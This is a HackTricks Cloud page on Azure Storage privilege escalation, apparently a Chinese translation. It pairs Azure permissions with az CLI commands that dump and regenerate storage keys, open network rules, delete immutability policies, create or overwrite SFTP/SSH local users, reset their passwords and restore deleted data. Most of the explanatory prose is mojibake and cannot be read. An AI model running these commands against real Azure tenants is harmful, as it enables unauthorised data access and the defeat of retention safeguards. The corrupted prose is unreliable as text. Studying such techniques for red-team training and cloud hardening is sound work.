# Az - Storage Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Storage Privesc

æœ‰å…³å­˜å‚¨çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../az-services/az-storage.md" %}
[az-storage.md](../az-services/az-storage.md)
{% endcontent-ref %}

### Microsoft.Storage/storageAccounts/listkeys/action

å…·æœ‰æ­¤æƒé™çš„ä¸»ä½“å°†èƒ½å¤Ÿåˆ—å‡ºï¼ˆä»¥åŠç§˜å¯†å€¼ï¼‰å­˜å‚¨å¸æˆ·çš„**è®¿é—®å¯†é’¥**ã€‚ å…è®¸ä¸»ä½“æå‡å…¶åœ¨å­˜å‚¨å¸æˆ·ä¸Šçš„æƒé™ã€‚
```bash
az storage account keys list --account-name <acc-name>
```
### Microsoft.Storage/storageAccounts/regenerateKey/action

å…·æœ‰æ­¤æƒé™çš„ä¸»ä½“å°†èƒ½å¤Ÿæ›´æ–°å¹¶è·å–å­˜å‚¨å¸æˆ·çš„**è®¿é—®å¯†é’¥**çš„æ–°ç§˜å¯†å€¼ã€‚è¿™å…è®¸ä¸»ä½“æå‡å…¶åœ¨å­˜å‚¨å¸æˆ·ä¸Šçš„æƒé™ã€‚

æ­¤å¤–ï¼Œåœ¨å“åº”ä¸­ï¼Œç”¨æˆ·å°†è·å¾—æ›´æ–°å¯†é’¥çš„å€¼ä»¥åŠæœªæ›´æ–°å¯†é’¥çš„å€¼ï¼š
```bash
az storage account keys renew --account-name <acc-name> --key key2
```
### Microsoft.Storage/storageAccounts/write

å…·æœ‰æ­¤æƒé™çš„ä¸»ä½“å°†èƒ½å¤Ÿåˆ›å»ºæˆ–æ›´æ–°ç°æœ‰çš„å­˜å‚¨å¸æˆ·ï¼Œæ›´æ–°ä»»ä½•è®¾ç½®ï¼Œä¾‹å¦‚ç½‘ç»œè§„åˆ™æˆ–ç­–ç•¥ã€‚

{% code overflow="wrap" %}
```bash
# e.g. set default action to allow so network restrictions are avoided
az storage account update --name <acc-name> --default-action Allow

# e.g. allow an IP address
az storage account update --name <acc-name> --add networkRuleSet.ipRules value=<ip-address>
```
{% endcode %}

## Blobç‰¹å®šæƒé™æå‡

### Microsoft.Storage/storageAccounts/blobServices/containers/immutabilityPolicies/write | Microsoft.Storage/storageAccounts/blobServices/containers/immutabilityPolicies/delete

ç¬¬ä¸€ä¸ªæƒé™å…è®¸**ä¿®æ”¹å®¹å™¨ä¸­çš„ä¸å¯å˜æ€§ç­–ç•¥**ï¼Œç¬¬äºŒä¸ªæƒé™å…è®¸åˆ é™¤å®ƒä»¬ã€‚

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå¦‚æœä¸å¯å˜æ€§ç­–ç•¥å¤„äºé”å®šçŠ¶æ€ï¼Œæ‚¨å°†æ— æ³•æ‰§è¡Œè¿™ä¸¤é¡¹æ“ä½œ
{% endhint %}
```bash
az storage container immutability-policy delete \
--account-name <STORAGE_ACCOUNT_NAME> \
--container-name <CONTAINER_NAME> \
--resource-group <RESOURCE_GROUP>

az storage container immutability-policy update \
--account-name <STORAGE_ACCOUNT_NAME> \
--container-name <CONTAINER_NAME> \
--resource-group <RESOURCE_GROUP> \
--period <NEW_RETENTION_PERIOD_IN_DAYS>
```
## æ–‡ä»¶å…±äº«ç‰¹å®šæƒé™æå‡

### Microsoft.Storage/storageAccounts/fileServices/takeOwnership/action

è¿™åº”è¯¥å…è®¸æ‹¥æœ‰æ­¤æƒé™çš„ç”¨æˆ·èƒ½å¤Ÿè·å–å…±äº«æ–‡ä»¶ç³»ç»Ÿå†…æ–‡ä»¶çš„æ‰€æœ‰æƒã€‚

### Microsoft.Storage/storageAccounts/fileServices/fileshares/files/modifypermissions/action

è¿™åº”è¯¥å…è®¸æ‹¥æœ‰æ­¤æƒé™çš„ç”¨æˆ·èƒ½å¤Ÿä¿®æ”¹å…±äº«æ–‡ä»¶ç³»ç»Ÿå†…æ–‡ä»¶çš„æƒé™ã€‚

### Microsoft.Storage/storageAccounts/fileServices/fileshares/files/actassuperuser/action

è¿™åº”è¯¥å…è®¸æ‹¥æœ‰æ­¤æƒé™çš„ç”¨æˆ·èƒ½å¤Ÿä»¥è¶…çº§ç”¨æˆ·èº«ä»½åœ¨æ–‡ä»¶ç³»ç»Ÿå†…æ‰§è¡Œæ“ä½œã€‚

### Microsoft.Storage/storageAccounts/localusers/write (Microsoft.Storage/storageAccounts/localusers/read)

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥ä¸º Azure å­˜å‚¨å¸æˆ·ï¼ˆé…ç½®äº†åˆ†å±‚å‘½åç©ºé—´ï¼‰åˆ›å»ºå’Œæ›´æ–°ï¼ˆå¦‚æœæ‹¥æœ‰ ```Microsoft.Storage/storageAccounts/localusers/read``` æƒé™ï¼‰æ–°çš„æœ¬åœ°ç”¨æˆ·ï¼ŒåŒ…æ‹¬æŒ‡å®šç”¨æˆ·çš„æƒé™å’Œä¸»ç›®å½•ã€‚æ­¤æƒé™éå¸¸é‡è¦ï¼Œå› ä¸ºå®ƒå…è®¸æ”»å‡»è€…æˆäºˆè‡ªå·±ç‰¹å®šæƒé™çš„å­˜å‚¨å¸æˆ·ï¼Œä¾‹å¦‚è¯»å–ï¼ˆrï¼‰ã€å†™å…¥ï¼ˆwï¼‰ã€åˆ é™¤ï¼ˆdï¼‰å’Œåˆ—å‡ºï¼ˆlï¼‰ç­‰ã€‚æ­¤å¤–ï¼Œä½¿ç”¨çš„èº«ä»½éªŒè¯æ–¹æ³•å¯ä»¥æ˜¯ Azure ç”Ÿæˆçš„å¯†ç å’Œ SSH å¯†é’¥å¯¹ã€‚æ²¡æœ‰æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç»å­˜åœ¨ï¼Œå› æ­¤æ‚¨å¯ä»¥è¦†ç›–å·²ç»å­˜åœ¨çš„å…¶ä»–ç”¨æˆ·ã€‚æ”»å‡»è€…å¯ä»¥æå‡ä»–ä»¬çš„æƒé™å¹¶è·å¾—å¯¹å­˜å‚¨å¸æˆ·çš„ SSH è®¿é—®æƒé™ï¼Œå¯èƒ½ä¼šæš´éœ²æˆ–å±å®³æ•æ„Ÿæ•°æ®ã€‚

{% code overflow="wrap" %}
```bash
az storage account local-user create \
--account-name <STORAGE_ACCOUNT_NAME> \
--resource-group <RESOURCE_GROUP_NAME> \
--name <LOCAL_USER_NAME> \
--permission-scope permissions=rwdl service=blob resource-name=<CONTAINER_NAME> \
--home-directory <HOME_DIRECTORY> \
--has-ssh-key false/true # Depends on the auth method to use
```
{% endcode %}

### Microsoft.Storage/storageAccounts/localusers/regeneratePassword/action

é€šè¿‡æ­¤æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥ä¸º Azure å­˜å‚¨å¸æˆ·ä¸­çš„æœ¬åœ°ç”¨æˆ·é‡æ–°ç”Ÿæˆå¯†ç ã€‚è¿™ä½¿æ”»å‡»è€…èƒ½å¤Ÿè·å–è¯¥ç”¨æˆ·çš„æ–°èº«ä»½éªŒè¯å‡­æ®ï¼ˆä¾‹å¦‚ SSH æˆ– SFTP å¯†ç ï¼‰ã€‚é€šè¿‡åˆ©ç”¨è¿™äº›å‡­æ®ï¼Œæ”»å‡»è€…å¯ä»¥è·å¾—å¯¹å­˜å‚¨å¸æˆ·çš„æœªç»æˆæƒè®¿é—®ï¼Œæ‰§è¡Œæ–‡ä»¶ä¼ è¾“æˆ–æ“çºµå­˜å‚¨å®¹å™¨ä¸­çš„æ•°æ®ã€‚è¿™å¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ã€æŸåæˆ–æ¶æ„ä¿®æ”¹å­˜å‚¨å¸æˆ·å†…å®¹ã€‚

{% code overflow="wrap" %}
```bash
az storage account local-user regenerate-password \
--account-name <STORAGE_ACCOUNT_NAME> \
--resource-group <RESOURCE_GROUP_NAME> \
--name <LOCAL_USER_NAME>
```
{% endcode %}

è¦é€šè¿‡ SFTP ä½¿ç”¨æœ¬åœ°ç”¨æˆ·è®¿é—® Azure Blob Storageï¼Œæ‚¨å¯ä»¥ï¼ˆæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨ ssh å¯†é’¥è¿›è¡Œè¿æ¥ï¼‰ï¼š

{% code overflow="wrap" %}
```bash
sftp <local-user-name>@<storage-account-name>.blob.core.windows.net
#regenerated-password
```
{% endcode %}

### Microsoft.Storage/storageAccounts/restoreBlobRanges/action, Microsoft.Storage/storageAccounts/blobServices/containers/read, Microsoft.Storage/storageAccounts/read && Microsoft.Storage/storageAccounts/listKeys/action

é€šè¿‡è¿™äº›æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æŒ‡å®šå·²åˆ é™¤ç‰ˆæœ¬ ID æ¥æ¢å¤å·²åˆ é™¤çš„å®¹å™¨ï¼Œæˆ–è€…åœ¨å®¹å™¨å†…æ¢å¤ç‰¹å®šçš„ blobï¼ˆå¦‚æœå®ƒä»¬ä¹‹å‰è¢«è½¯åˆ é™¤ï¼‰ã€‚è¿™ç§æƒé™æå‡å¯èƒ½å…è®¸æ”»å‡»è€…æ¢å¤æœ¬åº”æ°¸ä¹…åˆ é™¤çš„æ•æ„Ÿæ•°æ®ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æœªç»æˆæƒçš„è®¿é—®ã€‚

{% code overflow="wrap" %}
```bash
#Restore the soft deleted container
az storage container restore \
--account-name <STORAGE_ACCOUNT_NAME> \
--name <CONTAINER_NAME> \
--deleted-version <VERSION>

#Restore the soft deleted blob
az storage blob undelete \
--account-name <STORAGE_ACCOUNT_NAME> \
--container-name <CONTAINER_NAME> \
--name "fileName.txt"
```
{% endcode %}

### Microsoft.Storage/storageAccounts/fileServices/shares/restore/action && Microsoft.Storage/storageAccounts/read

æ‹¥æœ‰è¿™äº›æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æŒ‡å®šå·²åˆ é™¤ç‰ˆæœ¬ ID æ¥æ¢å¤å·²åˆ é™¤çš„ Azure æ–‡ä»¶å…±äº«ã€‚è¿™ç§æƒé™æå‡å¯èƒ½å…è®¸æ”»å‡»è€…æ¢å¤æœ¬åº”æ°¸ä¹…åˆ é™¤çš„æ•æ„Ÿæ•°æ®ï¼Œä»è€Œå¯èƒ½å¯¼è‡´æœªç»æˆæƒçš„è®¿é—®ã€‚

{% code overflow="wrap" %}
```bash
az storage share-rm restore \
--storage-account <STORAGE_ACCOUNT_NAME> \
--name <FILE_SHARE_NAME> \
--deleted-version <VERSION>
```
{% endcode %}

## å…¶ä»–æœ‰è¶£çš„æƒé™ (TODO)

* Microsoft.Storage/storageAccounts/blobServices/containers/blobs/manageOwnership/action: æ›´æ”¹ blob çš„æ‰€æœ‰æƒ
* Microsoft.Storage/storageAccounts/blobServices/containers/blobs/modifyPermissions/action: ä¿®æ”¹ blob çš„æƒé™
* Microsoft.Storage/storageAccounts/blobServices/containers/blobs/runAsSuperUser/action: è¿”å› blob å‘½ä»¤çš„ç»“æœ
* Microsoft.Storage/storageAccounts/blobServices/containers/blobs/immutableStorage/runAsSuperUser/action

## å‚è€ƒæ–‡çŒ®

* [https://learn.microsoft.com/en-us/azure/role-based-access-control/permissions/storage#microsoftstorage](https://learn.microsoft.com/en-us/azure/role-based-access-control/permissions/storage#microsoftstorage)
* [https://learn.microsoft.com/en-us/azure/storage/blobs/secure-file-transfer-protocol-support](https://learn.microsoft.com/en-us/azure/storage/blobs/secure-file-transfer-protocol-support)


{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
